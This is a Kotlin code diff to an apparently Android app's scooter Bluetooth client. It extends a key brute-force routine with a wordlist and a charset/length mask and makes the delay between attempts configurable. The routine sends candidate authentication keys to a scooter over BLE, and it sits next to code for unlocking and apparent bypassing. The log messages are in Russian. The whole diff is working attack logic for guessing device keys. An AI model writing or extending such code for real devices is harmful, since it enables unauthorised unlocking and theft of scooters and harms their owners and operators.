@@ -99,6 +99,8 @@ object ScooterClient : BleTransport.Listener {
     private var bruteRunnable: Runnable? = null
     private var keyBruteRunning = false
     private var keyBruteCandidates: List<String> = emptyList()
+    private var keyBruteMask: Iterator<String>? = null
+    private var keyBruteMaskTotal = 0L
     private var keyBruteIndex = 0
     private var keyBruteTried = 0
     private var keyBruteRunnable: Runnable? = null
@@ -541,17 +543,27 @@ object ScooterClient : BleTransport.Listener {
         stopKeyBrute()
         cancelUnlock()
         bypassPending = false
-        val candidates = ScooterCodec.keyCandidates(deviceName, prefs.bleKey)
-        if (candidates.isEmpty()) {
+        val wordlist = ScooterCodec.parseWordlist(prefs.keyBruteWordlist)
+        val candidates = ScooterCodec.keyCandidates(deviceName, prefs.bleKey, wordlist)
+        val charset = prefs.keyBruteCharset
+        val length = prefs.keyBruteLength
+        val maskTotal = ScooterCodec.keySequenceCount(charset, length)
+        if (candidates.isEmpty() && maskTotal <= 0L) {
             LogBus.warn(KEYBRUTE_TAG, "Нет кандидатов для перебора")
             return
         }
         keyBruteCandidates = candidates
+        keyBruteMask = if (maskTotal > 0L) ScooterCodec.keySequence(charset, length).iterator() else null
+        keyBruteMaskTotal = maskTotal
         keyBruteIndex = 0
         keyBruteTried = 0
         keyBruteRunning = true
         authFromBrute = true
-        LogBus.warn(KEYBRUTE_TAG, "Перебор ключей, кандидатов ${candidates.size}")
+        val interval = prefs.keyBruteIntervalMs.toLong()
+        LogBus.warn(
+            KEYBRUTE_TAG,
+            "Перебор ключей: словарь ${candidates.size}, маска $maskTotal, интервал $interval мс",
+        )
         val runnable = object : Runnable {
             override fun run() {
                 if (!keyBruteRunning) return
@@ -559,16 +571,19 @@ object ScooterClient : BleTransport.Listener {
                     stopKeyStringBrute()
                     return
                 }
-                if (keyBruteIndex >= keyBruteCandidates.size) {
+                val candidate = when {
+                    keyBruteIndex < keyBruteCandidates.size -> keyBruteCandidates[keyBruteIndex++]
+                    keyBruteMask?.hasNext() == true -> keyBruteMask?.next()
+                    else -> null
+                }
+                if (candidate == null) {
                     stopKeyStringBrute()
                     LogBus.warn(KEYBRUTE_TAG, "Перебор завершен без успеха, проверено $keyBruteTried")
                     return
                 }
-                val candidate = keyBruteCandidates[keyBruteIndex]
-                keyBruteIndex += 1
                 keyBruteTried += 1
                 sendBruteKey(candidate)
-                if (keyBruteRunning) handler.postDelayed(this, KEY_BRUTE_INTERVAL_MS)
+                if (keyBruteRunning) handler.postDelayed(this, interval)
             }
         }
         keyBruteRunnable = runnable
@@ -580,7 +595,7 @@ object ScooterClient : BleTransport.Listener {
         authTried.add(candidate)
         authPending = true
         _state.value = ClientState.AUTHENTICATING
-        LogBus.verbose(KEYBRUTE_TAG, "Кандидат $keyBruteTried/${keyBruteCandidates.size}")
+        LogBus.verbose(KEYBRUTE_TAG, "Кандидат $keyBruteTried из ${keyBruteCandidates.size + keyBruteMaskTotal}")
         if (!writeFrame(ScooterCodec.keyCommand(candidate), null)) {
             authPending = false
         }
@@ -598,6 +613,8 @@ object ScooterClient : BleTransport.Listener {
         authPending = false
         keyBruteIndex = 0
         keyBruteTried = 0
+        keyBruteMask = null
+        keyBruteMaskTotal = 0L
         LogBus.info(KEYBRUTE_TAG, "Перебор ключей остановлен")
     }
 
